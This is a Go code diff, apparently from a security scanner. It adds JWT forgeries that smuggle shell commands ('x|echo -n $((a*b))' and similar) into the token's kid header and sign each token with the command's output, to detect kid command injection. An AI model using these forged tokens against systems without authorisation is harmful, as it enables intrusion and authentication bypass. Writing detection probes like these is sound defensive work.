@@ -57,6 +57,8 @@ import (
 	"crypto/sha256"
 	"encoding/json"
 	"fmt"
+	mathrand "math/rand/v2"
+	"strconv"
 	"strings"
 	"time"
 
@@ -432,6 +434,28 @@ func jwtKidForgeries(t JWTToken) []jwtForgery {
 	if tok, err := jwtSignHS256(header, t.RawPayload, []byte(secret)); err == nil {
 		out = append(out, jwtForgery{tok, fmt.Sprintf(
 			"kid injection: a token whose kid selects the constant %q, signed with that constant as the HMAC key, was accepted", secret)})
+	}
+	return append(out, jwtKidCommandForgeries(t)...)
+}
+
+// jwtKidCommandForgeries cover a kid passed to a shell that reads the key file (0vzb.44): the kid
+// runs an arithmetic command and the token is signed with its output, a product that is in neither
+// the kid nor the request, so acceptance proves the command ran.
+func jwtKidCommandForgeries(t JWTToken) []jwtForgery {
+	a, b := 1000+mathrand.IntN(9000), 1000+mathrand.IntN(9000)
+	product := strconv.Itoa(a * b)
+	expr := fmt.Sprintf("$((%d*%d))", a, b)
+	var out []jwtForgery
+	for _, kid := range []string{"x|echo -n " + expr, "x;echo -n " + expr, "x$(echo -n " + expr + ")"} {
+		for _, key := range []string{product, product + "\n"} {
+			header := map[string]any{"alg": "HS256", "kid": kid}
+			passthroughHeaderFields(header, t.Header, false)
+			if tok, err := jwtSignHS256(header, t.RawPayload, []byte(key)); err == nil {
+				out = append(out, jwtForgery{tok, fmt.Sprintf(
+					"kid command injection: a token whose kid %q runs %s, signed with that command's output %s, was accepted",
+					kid, expr, product)})
+			}
+		}
 	}
 	return out
 }
